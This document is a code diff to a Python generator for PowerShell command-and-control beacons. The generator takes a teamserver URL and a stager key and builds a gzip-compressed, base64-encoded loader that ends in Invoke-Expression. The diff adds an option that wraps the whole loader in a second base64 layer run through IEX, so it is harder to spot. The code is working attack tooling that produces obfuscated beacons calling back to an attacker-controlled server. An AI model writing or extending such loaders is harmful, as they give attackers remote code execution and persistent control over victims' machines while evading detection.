@@ -182,7 +182,6 @@ $script = $sr.ReadToEnd()
 Invoke-Expression $script
 '''.strip()
 
-# --- Compress using GZIP level 9 and PowerShell-compatible format ---
 def compress_gzip_compatible(data: bytes) -> bytes:
     buffer = BytesIO()
     with gzip.GzipFile(fileobj=buffer, mode="wb", compresslevel=9, mtime=0) as f:
@@ -195,22 +194,28 @@ def generate_loader(url: str, interval: int, key: str) -> str:
     b64 = base64.b64encode(compressed).decode()
     return LOADER_TEMPLATE.format(b64=b64)
 
+def obfuscate_script(script: str) -> str:
+    encoded = base64.b64encode(script.encode("utf-8")).decode()
+    return f'$e="{encoded}";IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e)))'
+
 def main():
-    parser = argparse.ArgumentParser(description="Gzip-Compatible PowerShell Beacon Loader Generator")
+    parser = argparse.ArgumentParser(description="PowerShell Beacon Generator with optional full obfuscation")
     parser.add_argument("url", help="Teamserver URL")
-    parser.add_argument("--interval", type=int, default=5)
-    parser.add_argument("--key", required=True)
+    parser.add_argument("--interval", type=int, default=5, help="Beacon sleep interval")
+    parser.add_argument("--key", required=True, help="Stager key")
+    parser.add_argument("--obfuscate", action="store_true", help="Wrap entire loader in base64")
     parser.add_argument("-o", "--output", help="Output PowerShell file")
 
     args = parser.parse_args()
     script = generate_loader(args.url, args.interval, args.key)
 
-    # Default output path
+    if args.obfuscate:
+        script = obfuscate_script(script)
+
     output_path = Path(args.output) if args.output else Path("build/beacon/ps_beacon.ps1")
     output_path.parent.mkdir(parents=True, exist_ok=True)
     output_path.write_text(script, encoding="utf-8")
-
-    print(f"[+] Loader saved to: {output_path}")
+    print(f"[+] Beacon saved to: {output_path}")
 
 if __name__ == "__main__":
     main()
